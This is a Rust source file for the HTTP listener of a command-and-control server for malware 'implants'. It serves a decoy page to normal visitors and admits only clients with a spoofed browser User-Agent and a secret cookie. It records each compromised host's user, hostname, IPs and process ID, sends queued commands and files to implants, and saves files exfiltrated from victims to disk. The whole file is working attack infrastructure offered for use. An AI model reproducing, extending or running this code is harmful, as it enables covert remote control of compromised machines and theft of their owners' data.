use actix_web::{web, HttpRequest, HttpResponse, Responder};
use base64::{engine::general_purpose::STANDARD, Engine as _};
use colored::Colorize;
use serde::{Deserialize, Serialize};
use std::path::PathBuf;
use std::sync::{Arc, Mutex};
use uuid::Uuid;

use crate::links::Links;

/// User-Agent that all implants must present.
const IMPLANT_UA: &str = "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko";

pub struct AppState {
    pub links: Arc<Mutex<Links>>,
}

// ── Request/Response types ──────────────────────────────────────────────────

#[derive(Deserialize)]
pub struct RegisterRequest {
    pub link_username: String,
    pub link_hostname: String,
    pub internal_ip: String,
    #[serde(default)]
    pub external_ip: String,
    pub platform: String,
    pub pid: u32,
}

#[derive(Deserialize)]
pub struct CallbackRequest {
    /// Output of the previously executed task (empty on first poll).
    pub q: String,
    /// ID of the completed task (empty if none).
    pub tasking: String,
}

#[derive(Serialize)]
struct TaskResponse {
    /// Command to execute (empty when idle).
    q: String,
    /// Task ID to track (empty when idle).
    tasking: String,
    /// Rolling request ID; implant must echo this on the next call.
    x_request_id: String,
    /// For file download tasks, contains base64 encoded file content
    #[serde(skip_serializing_if = "Option::is_none")]
    file: Option<String>,
    /// For file download tasks, contains the original file name
    #[serde(skip_serializing_if = "Option::is_none")]
    filename: Option<String>,
    /// For file upload tasks, contains base64 encoded file content to upload
    #[serde(skip_serializing_if = "Option::is_none")]
    upload: Option<String>,
    /// For file upload tasks, contains the destination path
    #[serde(skip_serializing_if = "Option::is_none")]
    upload_path: Option<String>,
}

// ── Header guards ───────────────────────────────────────────────────────────

fn ua_ok(req: &HttpRequest) -> bool {
    req.headers()
        .get("User-Agent")
        .and_then(|v| v.to_str().ok())
        .is_some_and(|ua| ua == IMPLANT_UA)
}

fn cookie_ok(req: &HttpRequest) -> bool {
    req.headers()
        .get("Cookie")
        .and_then(|v| v.to_str().ok())
        .is_some_and(|c| c.contains("banner=banner"))
}

fn parse_file_response(response: &str) -> Option<(String, String)> {
    if response.starts_with("FILE:") {
        let parts: Vec<&str> = response.splitn(3, ':').collect();
        if parts.len() == 3 {
            return Some((parts[1].to_string(), parts[2].to_string()));
        }
    }
    None
}

// ── Input validation ─────────────────────────────────────────────────────────

/// Truncate a String to at most `max` bytes, preserving UTF-8 boundaries.
fn truncate_field(mut s: String, max: usize) -> String {
    if s.len() > max {
        // Truncate at a valid char boundary
        let boundary = s
            .char_indices()
            .map(|(i, _)| i)
            .take_while(|&i| i < max)
            .last()
            .unwrap_or(0);
        s.truncate(boundary);
    }
    s
}

// ── File download storage ────────────────────────────────────────────────────

/// Decode a base64-encoded file and write it to `downloads/<link_name>/<filename>`.
/// Returns the path where the file was written, or an error string.
fn save_download(link_name: &str, remote_path: &str, b64_content: &str) -> Result<PathBuf, String> {
    let filename = std::path::Path::new(remote_path)
        .file_name()
        .map(|n| n.to_string_lossy().into_owned())
        .unwrap_or_else(|| "file".to_string());

    let dest_dir = PathBuf::from("downloads").join(link_name);
    std::fs::create_dir_all(&dest_dir)
        .map_err(|e| format!("[-] Failed to create downloads dir: {}", e))?;

    let data = STANDARD
        .decode(b64_content)
        .map_err(|e| format!("[-] Failed to decode file content: {}", e))?;

    let dest = dest_dir.join(&filename);
    std::fs::write(&dest, &data)
        .map_err(|e| format!("[-] Failed to write file: {}", e))?;

    Ok(dest)
}

// ── Handlers ────────────────────────────────────────────────────────────────

/// GET / – decoy for non-implant traffic.
pub async fn ok_handler() -> impl Responder {
    HttpResponse::Ok().body("Ok\n")
}

/// GET /js – Stage 1: set session cookie, validate User-Agent.
pub async fn stage1_handler(req: HttpRequest) -> impl Responder {
    if !ua_ok(&req) {
        return HttpResponse::NotFound().finish();
    }
    HttpResponse::Ok()
        .insert_header(("Set-Cookie", "banner=banner; Path=/"))
        .body("")
}

/// POST /static/register – Stage 2: implant registration.
pub async fn stage2_handler(
    req: HttpRequest,
    body: web::Json<RegisterRequest>,
    data: web::Data<AppState>,
) -> impl Responder {
    if !ua_ok(&req) || !cookie_ok(&req) {
        return HttpResponse::NotFound().finish();
    }

    // 0.5.8 — validate/truncate fields to prevent OOM from malicious payloads
    let username = truncate_field(body.link_username.clone(), 256);
    let hostname = truncate_field(body.link_hostname.clone(), 256);
    let internal_ip = truncate_field(body.internal_ip.clone(), 45);
    let external_ip = truncate_field(body.external_ip.clone(), 45);
    let platform = truncate_field(body.platform.clone(), 64);

    let mut links = data.links.lock().unwrap_or_else(|e| e.into_inner());
    let link = links.add_link(
        username,
        hostname,
        internal_ip,
        external_ip,
        platform,
        body.pid,
    );

    let resp = TaskResponse {
        q: String::new(),
        tasking: String::new(),
        x_request_id: link.x_request_id.to_string(),
        file: None,
        filename: None,
        upload: None,
        upload_path: None,
    };
    let link_name = link.name.clone();
    drop(links);

    tracing::info!(
        "New link: {} ({}@{}) [{}]",
        link_name,
        body.link_username,
        body.link_hostname,
        body.platform
    );
    crate::ui::print_cyan_bold(&format!(
        "[+] New link arrived: {} ({}@{}) [{}]",
        link_name, body.link_username, body.link_hostname, body.platform
    ));

    HttpResponse::Ok().json(resp)
}

/// POST /static/get – Stage 3: task polling / output callback.
///
/// Lock strategy (0.5.7): at most 2 Mutex acquisitions per request.
///  • Lock 1: resolve link_id from x-request-id.
///  • Lock 2 (conditional): process output, complete task, then release.
///    UI printing happens outside the lock.
///  • Lock 3: rotate x_request_id + dispatch next task.
pub async fn stage3_handler(
    req: HttpRequest,
    body: web::Json<CallbackRequest>,
    data: web::Data<AppState>,
) -> impl Responder {
    if !ua_ok(&req) || !cookie_ok(&req) {
        return HttpResponse::NotFound().finish();
    }

    let Some(x_req_id) = req
        .headers()
        .get("x-request-id")
        .and_then(|v| v.to_str().ok())
        .and_then(|s| Uuid::parse_str(s).ok())
    else {
        return HttpResponse::BadRequest().finish();
    };

    // ── Lock 1: resolve link_id ──────────────────────────────────────────────
    let link_id = {
        let links = data.links.lock().unwrap_or_else(|e| e.into_inner());
        links.find_by_request_id(x_req_id).map(|l| l.id)
    };
    let Some(link_id) = link_id else {
        return HttpResponse::NotFound().finish();
    };

    // ── Lock 2 (conditional): process callback output ────────────────────────
    // Collect info needed for UI printing; the lock is released before any I/O.
    let ui_message: Option<(String, String, String)>; // (link_name, cli_cmd, display_output)

    if !body.tasking.is_empty() {
        if let Ok(task_id) = Uuid::parse_str(&body.tasking) {
            if !body.q.is_empty() {
                let mut links = data.links.lock().unwrap_or_else(|e| e.into_inner());

                let (link_name, cli_cmd) = links
                    .get_link(link_id)
                    .map(|l| {
                        let cmd = l
                            .tasks
                            .iter()
                            .find(|t| t.id == task_id)
                            .map(|t| t.cli_command.clone())
                            .unwrap_or_default();
                        (l.name.clone(), cmd)
                    })
                    .unwrap_or_else(|| ("unknown".into(), String::new()));

                let is_download = cli_cmd.starts_with("download ");

                if is_download && body.q.starts_with("FILE:") {
                    // Save the file to disk; store path in task output.
                    if let Some((file_path, file_content)) = parse_file_response(&body.q) {
                        let display_msg = match save_download(&link_name, &file_path, &file_content) {
                            Ok(dest) => {
                                let msg = format!("[+] File saved to {}", dest.display());
                                if let Some(link) = links.get_link_mut(link_id) {
                                    if let Some(task) =
                                        link.tasks.iter_mut().find(|t| t.id == task_id)
                                    {
                                        task.file_name = Some(file_path.clone());
                                        task.output = msg.clone();
                                    }
                                }
                                msg
                            }
                            Err(e) => e,
                        };
                        ui_message = Some((link_name, cli_cmd, display_msg));
                    } else {
                        ui_message = None;
                    }
                } else {
                    ui_message = Some((link_name, cli_cmd, body.q.clone()));
                }

                links.complete_task(link_id, task_id, body.q.clone());
            } else {
                ui_message = None;
            }
        } else {
            ui_message = None;
        }
    } else {
        ui_message = None;
    }

    // Print to console outside the lock.
    if let Some((link_name, cli_cmd, output)) = ui_message {
        const OUTPUT_BOX_WIDTH: usize = 54;
        let now = chrono::Local::now().format("%H:%M:%S");
        let header_text = format!("═ {} · {} · {} ", link_name, cli_cmd, now);
        let pad = OUTPUT_BOX_WIDTH.saturating_sub(header_text.chars().count());
        crate::ui::print_cyan_bold(&format!("╔{}{}╗", header_text, "═".repeat(pad)));
        crate::ui::print(&format!("║ {}", output));
        crate::ui::print_cyan_bold(&format!("╚{}╝", "═".repeat(OUTPUT_BOX_WIDTH)));
        tracing::info!(
            "\n{}\n{}\n{}",
            format!("╔{}{}╗", header_text, "═".repeat(pad)).cyan().bold(),
            output,
            format!("╚{}╝", "═".repeat(OUTPUT_BOX_WIDTH)).cyan().bold(),
        );
    }

    // ── Lock 3: rotate request ID + dispatch next task ───────────────────────
    let new_x_req_id = Uuid::new_v4();
    let (q, tasking, file, filename, upload, upload_path) = {
        let mut links = data.links.lock().unwrap_or_else(|e| e.into_inner());
        links.update_checkin(link_id, new_x_req_id);
        links
            .get_next_task(link_id)
            .map(|d| {
                (
                    d.command,
                    d.task_id,
                    d.file_content,
                    d.file_name,
                    d.upload_content,
                    d.upload_path,
                )
            })
            .unwrap_or_default()
    };

    let resp = TaskResponse {
        q,
        tasking,
        x_request_id: new_x_req_id.to_string(),
        file,
        filename,
        upload,
        upload_path,
    };

    HttpResponse::Ok().json(resp)
}
